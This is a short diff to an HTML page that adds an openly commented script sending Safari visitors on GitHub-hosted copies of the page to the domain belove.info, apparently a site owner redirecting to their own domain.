@@ -1,4 +1,13 @@
 <!DOCTYPE html>
+
+<script>
+// ---------- Redirect GitHub URL to belove.info only in Safari ----------
+const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+if (isSafari && (location.hostname === "github.io" || location.hostname.includes("github.com"))) {
+  location.href = "https://belove.info";
+}
+</script>
+
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
